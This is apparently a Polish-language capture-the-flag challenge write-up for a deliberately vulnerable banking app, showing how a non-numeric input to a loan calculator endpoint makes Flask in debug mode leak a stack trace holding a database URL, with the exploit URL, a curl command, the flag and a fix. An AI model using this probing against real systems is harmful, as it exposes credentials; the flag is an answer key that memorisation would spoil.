# A10 — Mishandling of Exceptional Conditions

## Metadane
- **ID:** A10
- **Kategoria:** OWASP A10:2025 - Mishandling of Exceptional Conditions
- **Trudność:** easy
- **Punkty:** 100
- **Flaga:** `PWR{stacktrace_db_url_leaked}`

## Opis
Kalkulator rat kredytowych (`/api/loans/calculate`) nie obsługuje błędów wejściowych.
Gdy `amount` nie jest liczbą, Python rzuca `ValueError`.
Flask z `DEBUG=True` zwraca **pełny stack trace Werkzeug** w HTML
zawierający wartości zmiennych lokalnych — w tym `db_url` z flagą.

## Exploit

### W przeglądarce
```
http://localhost:5000/api/loans/calculate?amount=abc&rate=2
```

Przeglądarka pokaże interaktywny debugger Werkzeug z stack trace.
Znajdź ramkę funkcji `calculate_loan` i zmienną `db_url`.

### curl (zwraca HTML z stack trace)
```bash
curl "http://localhost:5000/api/loans/calculate?amount=abc&rate=2" \
  | grep -o 'PWR{[^}]*}'
```

### Wynik
W zmiennej `db_url` widocznej w stack trace:
```
postgresql://vulnbank:PWR{stacktrace_db_url_leaked}@db/vulnbank
```

## Jak to naprawić
```python
@loans_bp.route("/calculate", methods=["GET"])
def calculate_loan():
    try:
        amount = float(request.args.get("amount", ""))
        rate = float(request.args.get("rate", ""))
    except ValueError:
        return jsonify({"error": "Nieprawidłowe parametry"}), 400

    # ... reszta logiki
```

Oraz wyłącz DEBUG w produkcji:
```python
app.run(debug=False)  # lub FLASK_DEBUG=false w env
```

## Referencje
- OWASP A10:2025 - Mishandling of Exceptional Conditions
- [Werkzeug Debugger](https://werkzeug.palletsprojects.com/en/latest/debug/)
- [CWE-209: Generation of Error Message Containing Sensitive Information](https://cwe.mitre.org/data/definitions/209.html)
